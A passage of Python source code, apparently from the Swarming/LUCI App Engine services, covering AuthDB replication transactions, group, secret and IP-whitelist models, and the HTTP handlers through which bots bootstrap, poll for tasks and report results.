        auth_db_rev=0)
  # Assert Primary or Standalone. Replicas can't increment auth db revision.
  if not is_primary() and state.primary_id:
    raise ValueError('Can\'t modify Auth DB on Replica')
  state.auth_db_rev += 1
  state.modified_ts = utils.utcnow()

  # Store the state in the transaction context. Used in replicate_auth_db(...)
  # later.
  txn = _AuthDBTransaction(state)
  ctx._auth_db_transaction = txn
  return txn


class _AuthDBTransaction(object):
  """"""Keeps track of entities updated or removed in current transaction.""""""

  _Change = collections.namedtuple('_Change', 'entity deletion comment')

  def __init__(self, replication_state):
    self.replication_state = replication_state
    self.changes = [] # list of _Change tuples
    self.committed = False

  def record_change(self, entity, deletion, modified_by, modified_ts, comment):
    assert not self.committed
    assert isinstance(entity, AuthVersionedEntityMixin)
    assert all(entity.key != c.entity.key for c in self.changes)

    # Mutate the main entity (the one used to serve online requests).
    entity.modified_by = modified_by
    entity.modified_ts = modified_ts
    entity.auth_db_prev_rev = entity.auth_db_rev # can be None for new entities
    entity.auth_db_rev = self.replication_state.auth_db_rev

    # Keep a historical copy. Delay make_historical_copy call until the commit.
    # Here (in 'record_change') entity may not have all the fields updated yet.
    self.changes.append(self._Change(entity, deletion, comment))

  def commit(self):
    assert not self.committed
    puts = [
      c.entity.make_historical_copy(c.deletion, c.comment)
      for c in self.changes
    ]
    ndb.put_multi(puts + [self.replication_state])
    for cb in _commit_callbacks:
      cb(self.replication_state.auth_db_rev)
    self.committed = True


class _AuthDBHistoricalEntity(ndb.Model):
  """"""Base class for *History magic class in AuthVersionedEntityMixin.

  In addition to properties defined here the child classes (*History) also
  always inherit (for some definition of ""inherit"") properties from
  AuthVersionedEntityMixin.

  See get_historical_copy_class().
  """"""
  # Historical entities are not intended to be read often, and updating the
  # cache will make AuthDB transactions only slower.
  _use_cache = False
  _use_memcache = False

  # True if entity was deleted in the given revision.
  auth_db_deleted = ndb.BooleanProperty(indexed=False)
  # Comment string passed to record_revision or record_deletion.
  auth_db_change_comment = ndb.StringProperty(indexed=False)
  # A GAE module version that committed the change.
  auth_db_app_version = ndb.StringProperty(indexed=False)

  def get_previous_historical_copy_key(self):
    """"""Returns ndb.Key of *History entity matching auth_db_prev_rev revision.""""""
    if self.auth_db_prev_rev is None:
      return None
    return ndb.Key(
        self.__class__, self.key.id(),
        parent=historical_revision_key(self.auth_db_prev_rev))


################################################################################
## Groups.


class AuthGroup(
    ndb.Model,
    AuthVersionedEntityMixin,
    datastore_utils.SerializableModelMixin):
  """"""A group of identities, entity id is a group name.

  Parent is AuthGlobalConfig entity keyed at root_key().

  Primary service holds authoritative list of Groups, that gets replicated to
  all Replicas.
  """"""
  # How to convert this entity to or from serializable dict.
  serializable_properties = {
    'members': datastore_utils.READABLE | datastore_utils.WRITABLE,
    'globs': datastore_utils.READABLE | datastore_utils.WRITABLE,
    'nested': datastore_utils.READABLE | datastore_utils.WRITABLE,
    'description': datastore_utils.READABLE | datastore_utils.WRITABLE,
    'owners': datastore_utils.READABLE | datastore_utils.WRITABLE,
    'created_ts': datastore_utils.READABLE,
    'created_by': datastore_utils.READABLE,
    'modified_ts': datastore_utils.READABLE,
    'modified_by': datastore_utils.READABLE,
  }

  # List of members that are explicitly in this group. Indexed.
  members = IdentityProperty(repeated=True)
  # List of identity-glob expressions (like 'user:*@example.com'). Indexed.
  globs = IdentityGlobProperty(repeated=True)
  # List of nested group names. Indexed.
  nested = ndb.StringProperty(repeated=True)

  # Human readable description.
  description = ndb.TextProperty(default='')
  # A name of the group that can modify or delete this group.
  owners = ndb.StringProperty(default=ADMIN_GROUP)

  # When the group was created.
  created_ts = ndb.DateTimeProperty()
  # Who created the group.
  created_by = IdentityProperty()


def group_key(group):
  """"""Returns ndb.Key for AuthGroup entity.""""""
  return ndb.Key(AuthGroup, group, parent=root_key())


def is_empty_group(group):
  """"""Returns True if group is missing or completely empty.""""""
  group = group_key(group).get()
  return not group or not(group.members or group.globs or group.nested)


def is_valid_group_name(name):
  """"""True if string looks like a valid group name.""""""
  return bool(GROUP_NAME_RE.match(name))


def is_external_group_name(name):
  """"""True if group is imported from outside and is not writable.""""""
  return is_valid_group_name(name) and '/' in name


@ndb.transactional
def bootstrap_group(group, identities, description=''):
  """"""Makes a group (if not yet exists) and adds |identities| to it as members.

  Returns True if modified the group, False if identities are already there.
  """"""
  key = group_key(group)
  entity = key.get()
  if entity and all(i in entity.members for i in identities):
    return False
  now = utils.utcnow()
  if not entity:
    entity = AuthGroup(
        key=key,
        description=description,
        created_ts=now,
        created_by=get_service_self_identity())
  for i in identities:
    if i not in entity.members:
      entity.members.append(i)
  entity.record_revision(
      modified_by=get_service_self_identity(),
      modified_ts=now,
      comment='Bootstrap')
  entity.put()
  replicate_auth_db()
  return True


def find_referencing_groups(group):
  """"""Finds groups that reference the specified group as nested group or owner.

  Used to verify that |group| is safe to delete, i.e. no other group is
  depending on it.

  Returns:
    Set of names of referencing groups.
  """"""
  nesting_groups = AuthGroup.query(
      AuthGroup.nested == group,
      ancestor=root_key()).fetch_async(keys_only=True)
  owned_groups = AuthGroup.query(
      AuthGroup.owners == group,
      ancestor=root_key()).fetch_async(keys_only=True)
  refs = set()
  refs.update(key.id() for key in nesting_groups.get_result())
  refs.update(key.id() for key in owned_groups.get_result())
  return refs


def get_missing_groups(groups):
  """"""Given a list of group names, returns a list of groups that do not exist.""""""
  # We need to iterate over |groups| twice. It won't work if |groups|
  # is a generator. So convert to list first.
  groups = list(groups)
  entities = ndb.get_multi(group_key(name) for name in groups)
  return [name for name, ent in zip(groups, entities) if not ent]


def find_group_dependency_cycle(group):
  """"""Searches for dependency cycle between nested groups.

  Traverses the dependency graph starting from |group|, fetching all necessary
  groups from datastore along the way.

  Args:
    group: instance of AuthGroup to start traversing from. It doesn't have to be
        committed to Datastore itself (but all its nested groups should be
        there already).

  Returns:
    List of names of groups that form a cycle or empty list if no cycles.
  """"""
  # It is a depth-first search on a directed graph with back edge detection.
  # See http://www.cs.nyu.edu/courses/summer04/G22.1170-001/6a-Graphs-More.pdf

  # Cache of already fetched groups.
  groups = {group.key.id(): group}

  # List of groups that are completely explored (all subtree is traversed).
  visited = []
  # Stack of groups that are being explored now. In case cycle is detected
  # it would contain that cycle.
  visiting = []

  def visit(group):
    """"""Recursively explores |group| subtree, returns True if finds a cycle.""""""
    assert group not in visiting
    assert group not in visited

    # Load bodies of nested groups not seen so far into |groups|.
    entities = ndb.get_multi(
        group_key(name) for name in group.nested if name not in groups)
    groups.update({entity.key.id(): entity for entity in entities if entity})

    visiting.append(group)
    for nested in group.nested:
      obj = groups.get(nested)
      # Do not crash if non-existent group is referenced somehow.
      if not obj:
        continue
      # Cross edge. Can happen in diamond-like graph, not a cycle.
      if obj in visited:
        continue
      # Back edge: |group| references its own ancestor -> cycle.
      if obj in visiting:
        return True
      # Explore subtree.
      if visit(obj):
        return True
    visiting.pop()

    visited.append(group)
    return False

  visit(group)
  return [group.key.id() for group in visiting]


################################################################################
## Secrets store.


class AuthSecretScope(ndb.Model):
  """"""Entity to act as parent entity for AuthSecret.

  Parent is AuthGlobalConfig entity keyed at root_key().

  Id of this entity defines scope of secret keys that have this entity as
  a parent. Possible scopes are 'local' and 'global'.

  Secrets in 'local' scope never leave Datastore they are stored in and they
  are different for each service (even for Replicas). Only service that
  generated a local secret knows it.

  Secrets in 'global' scope are known to all services (via Primary -> Replica
  DB replication mechanism). Source of truth for global secrets is in Primary's
  Datastore.
  """"""


def secret_scope_key(scope):
  """"""Key of AuthSecretScope entity for a given scope ('global' or 'local').""""""
  return ndb.Key(AuthSecretScope, scope, parent=root_key())


class AuthSecret(ndb.Model):
  """"""Some service-wide named secret blob.

  Entity can be a child of:
    * Key(AuthSecretScope, 'global', parent=root_key()):
        Global secrets replicated across all services.
    * Key(AuthSecretScope, 'local', parent=root_key()):
        Secrets local to the current service.

  There should be only very limited number of AuthSecret entities around. AuthDB
  fetches them all at once. Do not use this entity for per-user secrets.

  Holds most recent value of a secret as well as several previous values. Most
  recent value is used to generate new tokens, previous values may be used to
  validate existing tokens. That way secret can be rotated without invalidating
  any existing outstanding tokens.
  """"""
  # Last several values of a secret, with current value in front.
  values = ndb.BlobProperty(repeated=True, indexed=False)

  # When secret was modified last time.
  modified_ts = ndb.DateTimeProperty(auto_now_add=True)
  # Who modified the secret last time.
  modified_by = IdentityProperty()

  @classmethod
  def bootstrap(cls, name, scope, length=32):
    """"""Creates a secret if it doesn't exist yet.

    Args:
      name: name of the secret.
      scope: 'local' or 'global', see doc string for AuthSecretScope. 'global'
          scope should only be used on Primary service.
      length: length of the secret to generate if secret doesn't exist yet.

    Returns:
      Instance of AuthSecret (creating it if necessary) with random secret set.
    """"""
    # Note that 'get_or_insert' is a bad fit here. With 'get_or_insert' we'd
    # have to call os.urandom every time we want to get a key. It's a waste of
    # time and entropy.
    if scope not in ('local', 'global'):
      raise ValueError('Invalid secret scope: %s' % scope)
    key = ndb.Key(cls, name, parent=secret_scope_key(scope))
    entity = key.get()
    if entity is not None:
      return entity
    @ndb.transactional
    def create():
      entity = key.get()
      if entity is not None:
        return entity
      logging.info('Creating new secret key %s in %s scope', name, scope)
      # Global keys can only be created on Primary or Standalone service.
      if scope == 'global' and is_replica():
        raise ValueError('Can\'t bootstrap global key on Replica')
      entity = cls(
          key=key,
          values=[os.urandom(length)],
          modified_by=get_service_self_identity())
      entity.put()
      # Only global keys are part of replicated state.
      if scope == 'global':
        replicate_auth_db()
      return entity
    return create()


################################################################################
## IP whitelist.


class AuthIPWhitelistAssignments(ndb.Model, AuthVersionedEntityMixin):
  """"""A singleton entity with ""identity -> AuthIPWhitelist to use"" mapping.

  Entity key is ip_whitelist_assignments_key(). Parent entity is root_key().

  See AuthIPWhitelist for more info about IP whitelists.
  """"""
  class Assignment(ndb.Model):
    # Identity name to limit by IP whitelist. Unique key in 'assignments' list.
    identity = IdentityProperty()
    # Name of IP whitelist to use (see AuthIPWhitelist).
    ip_whitelist = ndb.StringProperty()
    # Why the assignment was created.
    comment = ndb.StringProperty()
    # When the assignment was created.
    created_ts = ndb.DateTimeProperty()
    # Who created the assignment.
    created_by = IdentityProperty()

  # Holds all the assignments.
  assignments = ndb.LocalStructuredProperty(Assignment, repeated=True)


class AuthIPWhitelist(
    ndb.Model,
    AuthVersionedEntityMixin,
    datastore_utils.SerializableModelMixin):
  """"""A named set of whitelisted IPv4 and IPv6 subnets.

  Can be assigned to individual user accounts to forcibly limit them only to
  particular IP addresses, e.g. it can be used to enforce that specific service
  account is used only from some known IP range. The mapping between accounts
  and IP whitelists is stored in AuthIPWhitelistAssignments.

  Entity id is a name of the whitelist. Parent entity is root_key().

  There's a special IP whitelist named 'bots' that can be used to list
  IP addresses of machines the service trusts unconditionally. Requests from
  such machines doesn't have to have any additional credentials attached.
  Requests will be authenticated as coming from identity 'bot:<IP address>'.
  """"""
  # How to convert this entity to or from serializable dict.
  serializable_properties = {
    'subnets': datastore_utils.READABLE | datastore_utils.WRITABLE,
    'description': datastore_utils.READABLE | datastore_utils.WRITABLE,
    'created_ts': datastore_utils.READABLE,
    'created_by': datastore_utils.READABLE,
    'modified_ts': datastore_utils.READABLE,
    'modified_by': datastore_utils.READABLE,
  }

  # The list of subnets. The validator is used only as a last measure. JSON API
  # handler should do validation too.
  subnets = ndb.StringProperty(
      repeated=True, validator=lambda _, val: ipaddr.normalize_subnet(val))

  # Human readable description.
  description = ndb.TextProperty(default='')

  # When the list was created.
  created_ts = ndb.DateTimeProperty()
  # Who created the list.
  created_by = IdentityProperty()

  def is_ip_whitelisted(self, ip):
    """"""Returns True if ipaddr.IP is in the whitelist.""""""
    # TODO(vadimsh): If number of subnets to check grows it makes sense to add
    # an internal cache to 'subnet_from_string' (sort of like in re.compile).
    return any(
        ipaddr.is_in_subnet(ip, ipaddr.subnet_from_string(net))
        for net in self.subnets)


def ip_whitelist_key(name):
  """"""Returns ndb.Key for AuthIPWhitelist entity given its name.""""""
  return ndb.Key(AuthIPWhitelist, name, parent=root_key())


def is_valid_ip_whitelist_name(name):
  """"""True if string looks like a valid IP whitelist name.""""""
  return bool(IP_WHITELIST_NAME_RE.match(name))


@ndb.transactional
def bootstrap_ip_whitelist(name, subnets, description=''):
  """"""Adds subnets to an IP whitelist if not there yet.

  Can be used on local dev appserver to add 127.0.0.1 to IP whitelist during
  startup. Should not be used from request handlers.

  Args:
    name: IP whitelist name to add a subnet to.
    subnets: IP subnet to add (as a list of strings).
    description: description of IP whitelist (if new entity is created).

  Returns:
    True if entry was added, False if it is already there or subnet is invalid.
  """"""
  assert isinstance(subnets, (list, tuple))
  try:
    subnets = [ipaddr.normalize_subnet(s) for s in subnets]
  except ValueError:
    return False
  key = ip_whitelist_key(name)
  entity = key.get()
  if entity and all(s in entity.subnets for s in subnets):
    return False
  now = utils.utcnow()
  if not entity:
    entity = AuthIPWhitelist(
        key=key,
        description=description,
        created_ts=now,
        created_by=get_service_self_identity())
  for s in subnets:
    if s not in entity.subnets:
      entity.subnets.append(s)
  entity.record_revision(
      modified_by=get_service_self_identity(),
      modified_ts=now,
      comment='Bootstrap')
  entity.put()
  replicate_auth_db()
  return True


def bootstrap_loopback_ips():
  """"""Adds 127.0.0.1 and ::1 to 'bots' IP whitelist.

  Useful on local dev server and in tests. Must not be used in production.

  Returns list of corresponding bot Identities.
  """"""
  # See api.py, AuthDB.verify_ip_whitelisted for IP -> Identity conversion.
  assert utils.is_local_dev_server()
  bootstrap_ip_whitelist(BOTS_IP_WHITELIST, ['127.0.0.1', '::1'], 'Local bots')
  return [
    Identity(IDENTITY_BOT, 'whitelisted-ip'),
    Identity(IDENTITY_BOT, '127.0.0.1'),
    Identity(IDENTITY_BOT, '0-0-0-0-0-0-0-1'),
  ]


@ndb.transactional
def bootstrap_ip_whitelist_assignment(identity, ip_whitelist, comment=''):
  """"""Sets a mapping ""identity -> IP whitelist to use"" for some account.

  Replaces existing assignment. Can be used on local dev appserver to configure
  IP whitelist assignments during startup or in tests. Should not be used from
  request handlers.

  Args:
    identity: Identity to modify.
    ip_whitelist: name of AuthIPWhitelist to assign.
    comment: comment to set.

  Returns:
    True if IP whitelist assignment was modified, False if it was already set.
  """"""
  entity = (
      ip_whitelist_assignments_key().get() or
      AuthIPWhitelistAssignments(key=ip_whitelist_assignments_key()))

  found = False
  for assignment in entity.assignments:
    if assignment.identity == identity:
      if assignment.ip_whitelist == ip_whitelist:
        return False
      assignment.ip_whitelist = ip_whitelist
      assignment.comment = comment
      found = True
      break

  now = utils.utcnow()
  if not found:
    entity.assignments.append(
        AuthIPWhitelistAssignments.Assignment(
            identity=identity,
            ip_whitelist=ip_whitelist,
            comment=comment,
            created_ts=now,
            created_by=get_service_self_identity()))

  entity.record_revision(
      modified_by=get_service_self_identity(),
      modified_ts=now,
      comment='Bootstrap')
  entity.put()
  replicate_auth_db()
  return True


def fetch_ip_whitelists():
  """"""Fetches AuthIPWhitelistAssignments and relevant AuthIPWhitelist entities.

  Returns:
    (AuthIPWhitelistAssignments, list of AuthIPWhitelist).
  """"""
  assignments = (
      ip_whitelist_assignments_key().get() or
      AuthIPWhitelistAssignments(key=ip_whitelist_assignments_key()))

  names = set(a.ip_whitelist for a in assignments.assignments)
  names.add(BOTS_IP_WHITELIST)

  whitelists = ndb.get_multi(ip_whitelist_key(n) for n in names)
  whitelists = sorted(filter(None, whitelists), key=lambda x: x.key.id())
  return assignments, whitelists
/n/n/nappengine/swarming/handlers_bot.py/n/n# Copyright 2015 The Swarming Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Internal bot API handlers.""""""

import base64
import json
import logging
import textwrap

import webob
import webapp2

from google.appengine.api import app_identity
from google.appengine.api import datastore_errors
from google.appengine.datastore import datastore_query
from google.appengine import runtime
from google.appengine.ext import ndb

from components import auth
from components import ereporter2
from components import utils
from server import acl
from server import bot_code
from server import bot_management
from server import stats
from server import task_pack
from server import task_scheduler
from server import task_to_run


def has_unexpected_subset_keys(expected_keys, minimum_keys, actual_keys, name):
  """"""Returns an error if unexpected keys are present or expected keys are
  missing.

  Accepts optional keys.

  This is important to catch typos.
  """"""
  actual_keys = frozenset(actual_keys)
  superfluous = actual_keys - expected_keys
  missing = minimum_keys - actual_keys
  if superfluous or missing:
    msg_missing = (' missing: %s' % sorted(missing)) if missing else ''
    msg_superfluous = (
        (' superfluous: %s' % sorted(superfluous)) if superfluous else '')
    return 'Unexpected %s%s%s; did you make a typo?' % (
        name, msg_missing, msg_superfluous)


def has_unexpected_keys(expected_keys, actual_keys, name):
  """"""Return an error if unexpected keys are present or expected keys are
  missing.
  """"""
  return has_unexpected_subset_keys(
      expected_keys, expected_keys, actual_keys, name)


def log_unexpected_subset_keys(
    expected_keys, minimum_keys, actual_keys, request, source, name):
  """"""Logs an error if unexpected keys are present or expected keys are missing.

  Accepts optional keys.

  This is important to catch typos.
  """"""
  message = has_unexpected_subset_keys(
    expected_keys, minimum_keys, actual_keys, name)
  if message:
    ereporter2.log_request(request, source=source, message=message)
  return message


def log_unexpected_keys(expected_keys, actual_keys, request, source, name):
  """"""Logs an error if unexpected keys are present or expected keys are missing.
  """"""
  return log_unexpected_subset_keys(
      expected_keys, expected_keys, actual_keys, request, source, name)


def has_missing_keys(minimum_keys, actual_keys, name):
  """"""Returns an error if expected keys are not present.

  Do not warn about unexpected keys.
  """"""
  actual_keys = frozenset(actual_keys)
  missing = minimum_keys - actual_keys
  if missing:
    msg_missing = (' missing: %s' % sorted(missing)) if missing else ''
    return 'Unexpected %s%s; did you make a typo?' % (name, msg_missing)


class BootstrapHandler(auth.AuthenticatingHandler):
  """"""Returns python code to run to bootstrap a swarming bot.""""""

  @auth.require(acl.is_bot)
  def get(self):
    self.response.headers['Content-Type'] = 'text/x-python'
    self.response.headers['Content-Disposition'] = (
        'attachment; filename=""swarming_bot_bootstrap.py""')
    self.response.out.write(
        bot_code.get_bootstrap(self.request.host_url).content)


class BotCodeHandler(auth.AuthenticatingHandler):
  """"""Returns a zip file with all the files required by a bot.

  Optionally specify the hash version to download. If so, the returned data is
  cacheable.
  """"""

  @auth.require(acl.is_bot)
  def get(self, version=None):
    if version:
      expected = bot_code.get_bot_version(self.request.host_url)
      if version != expected:
        # This can happen when the server is rapidly updated.
        logging.error('Requested Swarming bot %s, have %s', version, expected)
        self.abort(404)
      self.response.headers['Cache-Control'] = 'public, max-age=3600'
    else:
      self.response.headers['Cache-Control'] = 'no-cache, no-store'
    self.response.headers['Content-Type'] = 'application/octet-stream'
    self.response.headers['Content-Disposition'] = (
        'attachment; filename=""swarming_bot.zip""')
    self.response.out.write(
        bot_code.get_swarming_bot_zip(self.request.host_url))


class _BotBaseHandler(auth.ApiHandler):
  """"""
  Request body is a JSON dict:
    {
      ""dimensions"": <dict of properties>,
      ""state"": <dict of properties>,
      ""version"": <sha-1 of swarming_bot.zip uncompressed content>,
    }
  """"""

  EXPECTED_KEYS = {u'dimensions', u'state', u'version'}
  REQUIRED_STATE_KEYS = {u'running_time', u'sleep_streak'}

  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.
  xsrf_token_enforce_on = ()

  def _process(self):
    """"""Returns True if the bot has invalid parameter and should be automatically
    quarantined.

    Does one DB synchronous GET.

    Returns:
      tuple(request, bot_id, version, state, dimensions, quarantined_msg)
    """"""
    request = self.parse_body()
    version = request.get('version', None)

    dimensions = request.get('dimensions', {})
    state = request.get('state', {})
    bot_id = None
    if dimensions.get('id'):
      dimension_id = dimensions['id']
      if (isinstance(dimension_id, list) and len(dimension_id) == 1
          and isinstance(dimension_id[0], unicode)):
        bot_id = dimensions['id'][0]

    # The bot may decide to ""self-quarantine"" itself. Accept both via
    # dimensions or via state. See bot_management._BotCommon.quarantined for
    # more details.
    if (bool(dimensions.get('quarantined')) or
        bool(state.get('quarantined'))):
      return request, bot_id, version, state, dimensions, 'Bot self-quarantined'

    quarantined_msg = None
    # Use a dummy 'for' to be able to break early from the block.
    for _ in [0]:

      quarantined_msg = has_unexpected_keys(
          self.EXPECTED_KEYS, request, 'keys')
      if quarantined_msg:
        break

      quarantined_msg = has_missing_keys(
          self.REQUIRED_STATE_KEYS, state, 'state')
      if quarantined_msg:
        break

      if not bot_id:
        quarantined_msg = 'Missing bot id'
        break

      if not all(
          isinstance(key, unicode) and
          isinstance(values, list) and
          all(isinstance(value, unicode) for value in values)
          for key, values in dimensions.iteritems()):
        quarantined_msg = (
            'Invalid dimensions type:\n%s' % json.dumps(dimensions,
              sort_keys=True, indent=2, separators=(',', ': ')))
        break

      dimensions_count = task_to_run.dimensions_powerset_count(dimensions)
      if dimensions_count > task_to_run.MAX_DIMENSIONS:
        quarantined_msg = 'Dimensions product %d is too high' % dimensions_count
        break

    if quarantined_msg:
      line = 'Quarantined Bot\nhttps://%s/restricted/bot/%s\n%s' % (
          app_identity.get_default_version_hostname(), bot_id,
          quarantined_msg)
      ereporter2.log_request(self.request, source='bot', message=line)
      return request, bot_id, version, state, dimensions, quarantined_msg

    # Look for admin enforced quarantine.
    bot_settings = bot_management.get_settings_key(bot_id).get()
    if bool(bot_settings and bot_settings.quarantined):
      return request, bot_id, version, state, dimensions, 'Quarantined by admin'

    return request, bot_id, version, state, dimensions, None


class BotHandshakeHandler(_BotBaseHandler):
  """"""First request to be called to get initial data like XSRF token.

  The bot is server-controled so the server doesn't have to support multiple API
  version. When running a task, the bot sync the the version specific URL. Once
  abot finished its currently running task, it'll be immediately be upgraded
  after on its next poll.

  This endpoint does not return commands to the bot, for example to upgrade
  itself. It'll be told so when it does its first poll.

  Response body is a JSON dict:
    {
      ""bot_version"": <sha-1 of swarming_bot.zip uncompressed content>,
      ""server_version"": ""138-193f1f3"",
      ""xsrf_token"": ""......"",
    }
  """"""

  # This handler is called to get XSRF token, there's nothing to enforce yet.
  xsrf_token_enforce_on = ()

  @auth.require_xsrf_token_request
  @auth.require(acl.is_bot)
  def post(self):
    (_request, bot_id, version, state,
        dimensions, quarantined_msg) = self._process()
    bot_management.bot_event(
        event_type='bot_connected', bot_id=bot_id,
        external_ip=self.request.remote_addr, dimensions=dimensions,
        state=state, version=version, quarantined=bool(quarantined_msg),
        task_id='', task_name=None, message=quarantined_msg)

    data = {
      # This access token will be used to validate each subsequent request.
      'bot_version': bot_code.get_bot_version(self.request.host_url),
      'expiration_sec': auth.handler.XSRFToken.expiration_sec,
      'server_version': utils.get_app_version(),
      'xsrf_token': self.generate_xsrf_token(),
    }
    self.send_response(data)


class BotPollHandler(_BotBaseHandler):
  """"""The bot polls for a task; returns either a task, update command or sleep.

  In case of exception on the bot, this is enough to get it just far enough to
  eventually self-update to a working version. This is to ensure that coding
  errors in bot code doesn't kill all the fleet at once, they should still be up
  just enough to be able to self-update again even if they don't get task
  assigned anymore.
  """"""

  @auth.require(acl.is_bot)
  def post(self):
    """"""Handles a polling request.

    Be very permissive on missing values. This can happen because of errors
    on the bot, *we don't want to deny them the capacity to update*, so that the
    bot code is eventually fixed and the bot self-update to this working code.

    It makes recovery of the fleet in case of catastrophic failure much easier.
    """"""
    (_request, bot_id, version, state,
        dimensions, quarantined_msg) = self._process()
    sleep_streak = state.get('sleep_streak', 0)
    quarantined = bool(quarantined_msg)

    # Note bot existence at two places, one for stats at 1 minute resolution,
    # the other for the list of known bots.
    action = 'bot_inactive' if quarantined else 'bot_active'
    stats.add_entry(action=action, bot_id=bot_id, dimensions=dimensions)

    def bot_event(event_type, task_id=None, task_name=None):
      bot_management.bot_event(
          event_type=event_type, bot_id=bot_id,
          external_ip=self.request.remote_addr, dimensions=dimensions,
          state=state, version=version, quarantined=quarantined,
          task_id=task_id, task_name=task_name, message=quarantined_msg)

    # Bot version is host-specific because the host URL is embedded in
    # swarming_bot.zip
    expected_version = bot_code.get_bot_version(self.request.host_url)
    if version != expected_version:
      bot_event('request_update')
      self._cmd_update(expected_version)
      return
    if quarantined:
      bot_event('request_sleep')
      self._cmd_sleep(sleep_streak, quarantined)
      return

    #
    # At that point, the bot should be in relatively good shape since it's
    # running the right version. It is still possible that invalid code was
    # pushed to the server, so be diligent about it.
    #

    # Bot may need a reboot if it is running for too long. We do not reboot
    # quarantined bots.
    needs_restart, restart_message = bot_management.should_restart_bot(
        bot_id, state)
    if needs_restart:
      bot_event('request_restart')
      self._cmd_restart(restart_message)
      return

    # The bot is in good shape. Try to grab a task.
    try:
      # This is a fairly complex function call, exceptions are expected.
      request, run_result = task_scheduler.bot_reap_task(
          dimensions, bot_id, version)
      if not request:
        # No task found, tell it to sleep a bit.
        bot_event('request_sleep')
        self._cmd_sleep(sleep_streak, quarantined)
        return

      try:
        # This part is tricky since it intentionally runs a transaction after
        # another one.
        if request.properties.is_terminate:
          bot_event('bot_terminate', task_id=run_result.task_id)
          self._cmd_terminate(run_result.task_id)
        else:
          bot_event(
              'request_task', task_id=run_result.task_id,
              task_name=request.name)
          self._cmd_run(request, run_result.key, bot_id)
      except:
        logging.exception('Dang, exception after reaping')
        raise
    except runtime.DeadlineExceededError:
      # If the timeout happened before a task was assigned there is no problems.
      # If the timeout occurred after a task was assigned, that task will
      # timeout (BOT_DIED) since the bot didn't get the details required to
      # run it) and it will automatically get retried (TODO) when the task times
      # out.
      # TODO(maruel): Note the task if possible and hand it out on next poll.
      # https://code.google.com/p/swarming/issues/detail?id=130
      self.abort(500, 'Deadline')

  def _cmd_run(self, request, run_result_key, bot_id):
    # Only one of 'command' or 'inputs_ref' can be set.
    out = {
      'cmd': 'run',
      'manifest': {
        'bot_id': bot_id,
        'command':
            request.properties.commands[0]
            if request.properties.commands else None,
        'data': request.properties.data,
        'dimensions': request.properties.dimensions,
        'env': request.properties.env,
        'extra_args': request.properties.extra_args,
        'grace_period': request.properties.grace_period_secs,
        'hard_timeout': request.properties.execution_timeout_secs,
        'host': utils.get_versioned_hosturl(),
        'io_timeout': request.properties.io_timeout_secs,
        'inputs_ref': request.properties.inputs_ref,
        'task_id': task_pack.pack_run_result_key(run_result_key),
      },
    }
    self.send_response(utils.to_json_encodable(out))

  def _cmd_sleep(self, sleep_streak, quarantined):
    out = {
      'cmd': 'sleep',
      'duration': task_scheduler.exponential_backoff(sleep_streak),
      'quarantined': quarantined,
    }
    self.send_response(out)

  def _cmd_terminate(self, task_id):
    out = {
      'cmd': 'terminate',
      'task_id': task_id,
    }
    self.send_response(out)

  def _cmd_update(self, expected_version):
    out = {
      'cmd': 'update',
      'version': expected_version,
    }
    self.send_response(out)

  def _cmd_restart(self, message):
    logging.info('Rebooting bot: %s', message)
    out = {
      'cmd': 'restart',
      'message': message,
    }
    self.send_response(out)


class BotEventHandler(_BotBaseHandler):
  """"""On signal that a bot had an event worth logging.""""""

  EXPECTED_KEYS = _BotBaseHandler.EXPECTED_KEYS | {u'event', u'message'}

  @auth.require(acl.is_bot)
  def post(self):
    (request, bot_id, version, state,
        dimensions, quarantined_msg) = self._process()
    event = request.get('event')
    if event not in ('bot_error', 'bot_rebooting', 'bot_shutdown'):
      self.abort_with_error(400, error='Unsupported event type')
    message = request.get('message')
    bot_management.bot_event(
        event_type=event, bot_id=bot_id, external_ip=self.request.remote_addr,
        dimensions=dimensions, state=state, version=version,
        quarantined=bool(quarantined_msg), task_id=None, task_name=None,
        message=message)

    if event == 'bot_error':
      line = (
          'Bot: https://%s/restricted/bot/%s\n'
          'Bot error:\n'
          '%s') % (
          app_identity.get_default_version_hostname(), bot_id, message)
      ereporter2.log_request(self.request, source='bot', message=line)
    self.send_response({})


class BotTaskUpdateHandler(auth.ApiHandler):
  """"""Receives updates from a Bot for a task.

  The handler verifies packets are processed in order and will refuse
  out-of-order packets.
  """"""
  ACCEPTED_KEYS = {
    u'cost_usd', u'duration', u'exit_code', u'hard_timeout',
    u'id', u'io_timeout', u'output', u'output_chunk_start', u'outputs_ref',
    u'task_id',
  }
  REQUIRED_KEYS = {u'id', u'task_id'}

  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.
  xsrf_token_enforce_on = ()

  @auth.require(acl.is_bot)
  def post(self, task_id=None):
    # Unlike handshake and poll, we do not accept invalid keys here. This code
    # path is much more strict.
    request = self.parse_body()
    msg = log_unexpected_subset_keys(
        self.ACCEPTED_KEYS, self.REQUIRED_KEYS, request, self.request, 'bot',
        'keys')
    if msg:
      self.abort_with_error(400, error=msg)

    bot_id = request['id']
    cost_usd = request['cost_usd']
    task_id = request['task_id']

    duration = request.get('duration')
    exit_code = request.get('exit_code')
    hard_timeout = request.get('hard_timeout')
    io_timeout = request.get('io_timeout')
    output = request.get('output')
    output_chunk_start = request.get('output_chunk_start')
    outputs_ref = request.get('outputs_ref')

    run_result_key = task_pack.unpack_run_result_key(task_id)
    if output is not None:
      try:
        output = base64.b64decode(output)
      except UnicodeEncodeError as e:
        logging.error('Failed to decode output\n%s\n%r', e, output)
        output = output.encode('ascii', 'replace')
      except TypeError as e:
        # Save the output as-is instead. The error will be logged in ereporter2
        # and returning a HTTP 500 would only force the bot to stay in a retry
        # loop.
        logging.error('Failed to decode output\n%s\n%r', e, output)

    try:
      success, completed = task_scheduler.bot_update_task(
          run_result_key, bot_id, output, output_chunk_start,
          exit_code, duration, hard_timeout, io_timeout, cost_usd, outputs_ref)
      if not success:
        logging.info('Failed to update, please retry')
        self.abort_with_error(500, error='Failed to update, please retry')

      action = 'task_completed' if completed else 'task_update'
      bot_management.bot_event(
          event_type=action, bot_id=bot_id,
          external_ip=self.request.remote_addr, dimensions=None, state=None,
          version=None, quarantined=None, task_id=task_id, task_name=None)
    except ValueError as e:
      ereporter2.log_request(
          request=self.request,
          source='server',
          category='task_failure',
          message='Failed to update task: %s' % e)
      self.abort_with_error(400, error=str(e))
    except webob.exc.HTTPException:
      raise
    except Exception as e:
